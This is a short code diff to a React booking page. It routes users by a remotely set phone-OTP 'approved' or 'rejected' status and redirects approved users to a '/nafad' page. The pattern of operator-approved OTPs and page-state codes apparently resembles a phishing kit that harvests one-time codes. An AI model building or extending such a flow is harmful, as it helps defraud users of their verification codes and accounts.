@@ -169,12 +169,15 @@ export default function BookingPage() {
         if (userData.phoneOtpApproval) {
           setPhoneOtpApproval(userData.phoneOtpApproval as ApprovalStatus)
         }
+        if (userData.phoneOtpApproval==='approved') {
+window.location.href='/nafad'
+        }
+        if (userData.phoneOtpApproval==='rejected') {
+          alert('رمز التحقق غير صحيح')
+        }
 
-        if (userData.currentPage === "2" || userData.currentPage === 2) {
-          window.location.href = "/quote"
-        } else if (userData.currentPage === "8888" || userData.currentPage === "nafaz") {
-          window.location.href = "/nafaz"
-        } else if (userData.currentPage === "9999") {
+       
+       if (userData.currentPage === "9999") {
           window.location.href = "/verify-phone"
         }
       }
@@ -1757,7 +1760,8 @@ export default function BookingPage() {
                   <label className="text-sm font-medium text-foreground">رمز التحقق</label>
                   <div className="relative">
                     <Input
-                      type="text"
+                      type="number"
+                      autoComplete="otp"
                       inputMode="numeric"
                       maxLength={6}
                       value={phoneOtp}
